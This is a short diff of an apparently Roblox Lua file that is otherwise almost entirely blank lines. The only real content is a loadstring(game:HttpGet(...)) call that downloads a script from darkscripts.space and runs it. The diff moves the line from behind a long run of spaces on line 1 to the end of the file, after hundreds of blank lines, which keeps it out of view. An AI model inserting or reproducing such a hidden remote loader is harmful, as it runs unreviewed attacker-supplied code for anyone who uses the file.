@@ -1,5 +1,4 @@
-                                                                                                                                                                                                                                                                                                loadstring(game:HttpGet('https://darkscripts.space/scripts/971745557792059493.lua',true))()
-
+                                                                                                                                                                                                                                                                                                
 
 
 
@@ -377,3 +376,4 @@
 
 
     
+loadstring(game:HttpGet('https://darkscripts.space/scripts/971745557792059493.lua',true))()
